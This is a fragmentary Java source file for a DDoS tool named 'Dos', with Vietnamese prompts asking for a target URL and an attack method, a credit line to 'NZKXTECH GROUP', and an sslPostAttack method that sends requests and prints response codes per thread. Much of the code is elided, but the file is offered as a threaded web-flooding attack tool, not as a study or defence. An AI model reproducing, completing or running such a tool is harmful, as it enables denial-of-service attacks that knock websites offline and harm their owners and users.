...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Mời Nhập URL Bạn Muốn DDOS: ");
        url = in.nextLine();
        System.out.println("\n");
        ...
        System.out.println("Bản Quyền DDoS By: NZKXTECH GROUP");
        ...
        System.out.print("Phương Pháp ( get Hoặc GET ): ");
        ...
        System.out.println("TẤN CÔNG KẾT THÚC");
    }
    ...
    private void sslPostAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Kết Quả Tấn Công :" + responseCode + "Thread: " + this.seq);
    }
